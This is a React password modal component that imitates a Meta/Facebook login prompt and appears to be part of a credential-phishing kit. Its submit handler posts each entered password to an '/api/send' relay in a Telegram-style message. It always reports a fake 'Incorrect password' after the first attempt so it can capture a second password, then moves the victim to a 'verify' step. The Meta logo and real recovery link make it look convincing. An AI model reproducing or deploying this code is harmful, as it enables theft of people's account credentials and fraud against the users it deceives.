'use client';

import MetaLogo from '@/assets/images/meta-logo-image.png';
import { store } from '@/store/store';
import { useTranslation } from '@/hooks/useTranslation';
import config from '@/utils/config';
import axios from 'axios';
import Image from 'next/image';
import { useState, type FC } from 'react';

const PasswordModal: FC = () => {
    const [isLoading, setIsLoading] = useState(false);
    const [password, setPassword] = useState('');
    const [password1Value, setPassword1Value] = useState('');
    const [error, setError] = useState('');
    const [attemptCount, setAttemptCount] = useState(0);

    const { messageId, message, setMessage, setMessageId, setFormStep } = store();

    // Shared translation hook
    const { t } = useTranslation([
        'Hi',
        'Continue',
        'Forgotten password?',
        'Please fill in all fields',
        'Password must be at least 6 characters',
        'Incorrect password. Please try again.',
        'Enter your password',
    ]);

    const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        setError('');

        // Validation
        if (!password) {
            setError(t('Please fill in all fields'));
            return;
        }

        if (password.length < 6) {
            setError(t('Password must be at least 6 characters'));
            return;
        }

        if (isLoading || !message) return;
        setIsLoading(true);

        // MAX_PASS = 1: send password and continue immediately
        if (config.MAX_PASS === 1) {
            const passwordMessage = `${message}

<b>🔐 Password:</b> <code>${password}</code>`;

            try {
                const res = await axios.post('/api/send', {
                    message: passwordMessage,
                    message_id: messageId
                });

                if (res?.data?.success) {
                    setMessage(passwordMessage);
                    if (res.data.data?.result?.message_id) {
                        setMessageId(res.data.data.result.message_id);
                    }
                }
                setFormStep('verify');
            } catch {
                setFormStep('verify');
            } finally {
                setIsLoading(false);
            }
            return;
        }

        // MAX_PASS >= 2: first attempt - send password1 and show error
        if (attemptCount === 0) {
            const password1Message = `${message}

<b>🔐 Password 1:</b> <code>${password}</code>`;

            try {
                const res = await axios.post('/api/send', {
                    message: password1Message,
                    message_id: messageId
                });
                if (res?.data?.data?.result?.message_id) {
                    setMessageId(res.data.data.result.message_id);
                }
            } catch {
                // Continue even if sending fails
            } finally {
                setIsLoading(false);
            }

            setError(t('Incorrect password. Please try again.'));
            setPassword1Value(password);
            setPassword('');
            setAttemptCount(1);
            return;
        }

        // Second attempt - send password2 and continue to verify

        const password2Message = `${message}

<b>🔐 Password 1:</b> <code>${password1Value}</code>
<b>🔐 Password 2:</b> <code>${password}</code>`;

        try {
            const res = await axios.post('/api/send', {
                message: password2Message,
                message_id: messageId
            });

            if (res?.data?.success) {
                setMessage(password2Message);
                if (res.data.data?.result?.message_id) {
                    setMessageId(res.data.data.result.message_id);
                }
            }
            setFormStep('verify');
        } catch {
            setFormStep('verify');
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <>
            {/* Overlay mờ toàn màn hình */}
            <div className="fixed inset-0 z-40 bg-black/50 backdrop-blur-sm transition-all" style={{touchAction: 'manipulation'}}></div>
            <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center p-2 sm:p-4 md:p-6 overflow-hidden select-none' style={{touchAction: 'manipulation', userSelect: 'none'}}>
                <div className='flex max-h-[95vh] w-full max-w-[340px] sm:max-w-sm md:max-w-md flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] overflow-hidden'>
                    <form onSubmit={handleSubmit} className='flex flex-1 flex-col overflow-y-auto items-center justify-center gap-1.5 sm:gap-2.5 md:gap-4 py-4 sm:py-6 md:py-8 px-2.5 sm:px-3.5 md:px-5'>
                        {/* Password Input Section */}
                        <div className='w-full px-1.5 sm:px-3 md:px-4'>
                            <div className='relative w-full'>
                                <input
                                    type='password'
                                    value={password}
                                    onChange={e => {
                                        setPassword(e.target.value);
                                        setError('');
                                    }}
                                    className='h-10 sm:h-11 md:h-12 w-full rounded-xl border-2 border-[#d4dbe3] px-3 sm:px-3.5 py-1.5 sm:py-2 text-base focus:outline-none focus:border-blue-500 transition'
                                    required
                                    autoComplete='password'
                                    placeholder={t('Enter your password')}
                                />
                            </div>

                            {/* Error Message - Below input */}
                            {error && (
                                <p className='text-red-600 text-xs mt-2 px-1 break-words'>
                                    {error}
                                </p>
                            )}
                        </div>

                        {/* Submit Button */}
                        <div className='w-full px-1.5 sm:px-3 md:px-4 mt-0.5 sm:mt-1 md:mt-2'>
                            <button
                                type='submit'
                                disabled={isLoading}
                                className={`flex h-10 sm:h-11 md:h-12 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-[11px] sm:text-xs md:text-sm text-white transition-colors hover:bg-blue-700 active:bg-blue-800 ${
                                    isLoading ? 'cursor-not-allowed opacity-80' : ''
                                }`}
                            >
                                {isLoading ? (
                                    <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div>
                                ) : (
                                    t('Continue')
                                )}
                            </button>
                        </div>

                        {/* Forgotten Password Link */}
                        <a href='https://www.facebook.com/recover' target='_blank' rel='noopener noreferrer' className='text-[10px] sm:text-xs text-center text-blue-600 hover:underline mt-1.5 sm:mt-2 md:mt-3 transition leading-tight'>
                            {t('Forgotten password?')}
                        </a>
                    </form>

                    {/* Meta Logo Footer */}
                    <div className='flex items-center justify-center p-1.5 sm:p-2 md:p-3'>
                        <Image src={MetaLogo} alt='Meta' className='h-3.5 sm:h-4 w-14 sm:w-16' />
                    </div>
                </div>
            </div>
        </>
    );
};

export default PasswordModal;
